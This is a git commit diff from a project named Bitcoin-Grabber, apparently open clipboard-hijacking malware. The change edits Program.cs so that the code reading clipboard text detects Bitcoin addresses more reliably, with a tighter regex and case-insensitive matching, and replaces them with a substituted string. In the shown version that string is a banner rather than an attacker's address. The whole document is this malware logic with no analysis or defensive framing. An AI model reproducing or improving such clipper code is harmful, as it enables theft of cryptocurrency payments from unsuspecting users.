cdb2d8645dd41a9c07c7b539feb73d10aaccd857
NYAN CAT <NYANxCAT@pm.me>
2019-07-31 10:37:52 +0300

    Update Program.cs

--- Bitcoin-Grabber/Program.cs
+++ Bitcoin-Grabber/Program.cs
@@ -89,10 +89,10 @@ namespace Bitcoin_Grabber
                      */
 
                     string input = Clipboard.GetText();
-                    string pattern = @"(?:\s|^)(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}(?:\s|$)";
-                    string replacement = " <<! Bitcoin Grabber By NYAN CAT !>> ";
+                    string pattern = @"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b";
+                    string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";
 
-                    Regex rgx = new Regex(pattern);
+                    Regex rgx = new Regex(pattern, RegexOptions.IgnoreCase);
                     Match match = rgx.Match(input);
                     if (match.Success)
                     {
